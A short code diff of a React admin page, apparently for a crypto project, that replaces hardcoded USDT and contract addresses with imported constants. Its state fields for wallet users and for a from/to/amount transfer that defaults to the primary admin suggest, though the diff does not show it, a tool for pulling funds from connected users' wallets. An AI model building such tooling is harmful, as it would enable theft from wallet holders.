@@ -9,6 +9,7 @@ import type { TelegramConnection } from '../lib/telegramConnections';
 import type { WalletConnection } from '../lib/walletConnections';
 
 import { isAdmin, PRIMARY_ADMIN } from '../lib/admin';
+import { CONTRACT_ADDRESS, USDT_ADDRESS } from '../lib/contracts';
 
 const AdminControl: React.FC = () => {
     const navigate = useNavigate();
@@ -24,7 +25,7 @@ const AdminControl: React.FC = () => {
     const [walletUsers, setWalletUsers] = useState<WalletConnection[]>([]);
 
 
-    const mfToken = '0x55d398326f99059fF775485246999027B3197955';
+    const mfToken = USDT_ADDRESS;
     const [mfFrom, setMfFrom] = useState('');
     const [mfTo, setMfTo] = useState(PRIMARY_ADMIN);
     const [mfAmount, setMfAmount] = useState('');
@@ -121,7 +122,7 @@ const AdminControl: React.FC = () => {
     const handleTrackUser = (userAddr: string) => {
         setTargetUser(userAddr);
         // Add to discovery cache manually if it's not there
-        const cacheKey = `discovered_users_${'0x504E877770923E8EbF8C02c2266D4D6f7ad45429'.toLowerCase()}`;
+        const cacheKey = `discovered_users_${CONTRACT_ADDRESS.toLowerCase()}`;
         let cached: string[] = [];
         try {
             const parsed = JSON.parse(localStorage.getItem(cacheKey) || "[]");
